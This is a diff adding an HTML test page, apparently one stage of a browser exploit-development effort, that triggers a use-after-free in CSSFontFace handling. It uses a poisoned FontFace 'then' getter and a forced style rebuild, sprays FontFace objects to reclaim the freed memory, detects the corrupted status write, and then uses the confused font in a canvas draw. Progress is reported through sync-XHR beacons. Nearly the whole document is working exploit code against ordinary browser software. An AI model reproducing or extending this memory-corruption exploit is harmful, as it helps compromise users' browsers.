@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V919</title></head>
+<body><pre id="out">V919 — FontFace carrier escalation: m_clients shape + status confusion (p640 construction, trigger-path free)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V919-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v919 — the open development item from p640_writeback_14.22_lands: the
+ * CSSFontFace-carrier escalation. The AB-carrier deaths (v912/v913) do NOT
+ * block this lane: the landing carrier is a CSSFontFace (bitfit 192), the
+ * engine's post-free setStatus write lands in it at +0x82 (value 3 =
+ * Status::Success), and the JS wrapper reads it back (p640: HIT 56, stable).
+ *
+ * Free path (p640-verbatim, trigger-path — L9-clean): poisoned
+ * FontFace.prototype.then getter fires inside target.load(); inside the
+ * getter the secondary style is dirtied + offsetHeight forces style
+ * rebuild => CSSFontSelector::addFontFaceRule re-creates and ADOPTS the
+ * face for the same rule => old CSSFontFace refcount 0 => free inside the
+ * getter; carriers sprayed inside the same getter, BEFORE the
+ * iterateClients + setStatus continuation.
+ *
+ * Arms (one per load, persisted, ?arm= overrides; S1 doubles as the p640
+ * determinism run):
+ *   S1  baseline (p640 replica): 160 carriers, each added to
+ *       document.fonts (m_clients = 1 client). Expect HIT index ~56.
+ *   S0  carriers NEVER added to any set (m_clients empty): does the
+ *       backing chunk still take the write? does the walk survive an
+ *       empty-client carrier? (v912's AB death was zeros at +0x58; an
+ *       un-added face may present a valid empty HashSet instead.)
+ *   SN  carriers added to document.fonts PLUS up to 40 extra FontFaceSet
+ *       objects each (m_clients out-of-line, N clients): does the walk
+ *       survive N-client iteration, does the write still land, does
+ *       anything else land? (FontFaceSet constructibility probed in-page.)
+ *   USE baseline + after HIT: ctx.font = '10px zz<idx>'; fillText —
+ *       the hit carrier has NO loadable source (local() miss) but the
+ *       engine wrote Status::Success into its chunk: a loaded-status font
+ *       with no backing. Death here = status-confusion crash at a fixed
+ *       engine site (PRE beacon marks it); survival = the engine
+ *       gracefully handles it (also a row).
+ *
+ * Sync-XHR beacons throughout (position-proof, board channel law).
+ */
+
+var ARMS=['S1','S0','SN','USE'];
+var st={arm:'S1',det:0,pending:null};
+try{
+  var m=location.search.match(/[?&]arm=(S0|S1|SN|USE|reset)/);
+  if(m){ if(m[1]==='reset'){localStorage.removeItem('v919_state');bk('RESET','cleared');}
+         else {st.arm=m[1]; localStorage.setItem('v919_state',JSON.stringify(st));} }
+  else { var raw=localStorage.getItem('v919_state'); if(raw) st=JSON.parse(raw); }
+}catch(e){}
+function save(){try{localStorage.setItem('v919_state',JSON.stringify(st));}catch(e){}}
+
+if(st.pending){
+  var pk=st.pending; st.pending=null; save();
+  bk('CRASH-MARK','arm='+pk.arm+' phase='+pk.ph+' died at the marked site (row banked)');
+}
+
+if(st.arm==='DONE'){
+  bk('EXHAUSTED','all arms done; reset with ?arm=reset to re-run');
+}else{
+  bk('BOOT','arm='+st.arm+' det='+st.det);
+
+  /* ---- p640 construction (verbatim skeleton) ---- */
+  var fs=document.createElement('style'); fs.id='fs';
+  fs.textContent='@font-face { font-family: s2; src: local(Arial); unicode-range: U+0043; }';
+  document.head.appendChild(fs);
+  var ds=document.createElement('style'); ds.id='ds'; ds.textContent='body { margin: 0; }';
+  document.head.appendChild(ds);
+
+  var FILL=80, N=160, target=null, fired=false, spray=[], warms=[], extraSets=0, fsetOK=false;
+  function fill(n){
+    for(var i=0;i<n;i++){ try{document.fonts.add(new FontFace('wf'+i,"local('ZZZZZ_WF_"+i+"')"));}catch(e){} }
+    var c=[]; for(var j=0;j<156;j++) c[j]=0;
+    for(var k=0;k<40;k++){ try{ warms.push(String.fromCharCode.apply(null,c)); }catch(e){} }
+  }
+  function scan(){
+    for(var i=0;i<spray.length;i++){
+      var s=''; try{s=String(spray[i].status);}catch(e){s='?';}
+      if(s!=='unloaded'&&s!=='pending'){ var f='?'; try{f=String(spray[i].family);}catch(e){} if(f==='zz'+i) return i+':'+s; }
+    }
+    return 'none';
+  }
+
+  try { var t1=new FontFaceSet([]); fsetOK=true; } catch(e){ fsetOK=false; }
+  bk('FSET','constructible='+fsetOK);
+
+  try{ document.fonts.forEach(function(f){ if(f.family==='s2') target=f; }); }catch(e){}
+  if(!target){ bk('NOFACE',''); } else {
+    fill(FILL);
+    void target.loaded;
+    bk('READY','st='+String(target.status));
+
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(fired) return undefined;
+        fired=true;
+        if(st.arm!=='CTL'){ try{ ds.textContent='body { margin: 1px; }'; }catch(e){}
+          try{ document.body.offsetHeight; }catch(e){}          /* rebuild => adopt => FREE (trigger path) */
+          for(var k=0;k<N;k++){
+            try{
+              var f=new FontFace('zz'+k,"local('ZZZZZ_NoFont_"+k+"')");
+              if(st.arm!=='S0'){
+                document.fonts.add(f);
+                if(st.arm==='SN'&&fsetOK){
+                  for(var e2=0;e2<40;e2++){ try{ var s2=new FontFaceSet([f]); extraSets++; }catch(e3){ break; } }
+                }
+              }
+              spray.push(f);
+            }catch(e){}
+          }
+          bk('SPRAYED','arm='+st.arm+'|n='+spray.length+'|extraSets='+extraSets);
+        }
+        return undefined;
+      },
+      set:function(){}
+    });
+
+    try{ target.load(); }catch(e){ bk('LOADERR','x'); }
+    bk('AFTERLOAD','ok');
+
+    var r=scan();
+    bk('HIT','arm='+st.arm+'|'+r);
+    if(r!=='none'){
+      var idx=parseInt(r,10);
+      var f='?'; try{f=String(spray[idx].family);}catch(e){}
+      var s2='?'; try{s2=String(spray[idx].status);}catch(e){}
+      bk('CARRIER','idx='+idx+'|family='+f+'|status='+s2+'|walk-survived=true');
+
+      if(st.arm==='USE'){
+        bk('USE-PRE','ctx.font = 10px zz'+idx+' (status-confused, no backing) — next event is the draw or the death');
+        var cv=document.createElement('canvas'); cv.width=64; cv.height=64;
+        var g=cv.getContext('2d');
+        g.font='10px zz'+idx;
+        g.fillStyle='#000';
+        g.fillText('ABC',4,20);
+        bk('USE-ALIVE','drew with status-confused carrier — engine tolerated it (row: no null-data crash)');
+        try{ void cv.toDataURL(); bk('USE-PIX','readback ok'); }catch(e){ bk('USE-PIX','ERR '+e.name); }
+      }
+    }
+
+    /* advance */
+    if(st.arm==='S1'){ st.arm='S0'; }
+    else if(st.arm==='S0'){ st.arm='SN'; }
+    else if(st.arm==='SN'){ st.arm='USE'; }
+    else if(st.arm==='USE'){ st.arm='DONE'; }
+    st.det++;
+    save();
+    setTimeout(function(){ location.reload(); }, 500);
+  }
+}
+</script></body></html>
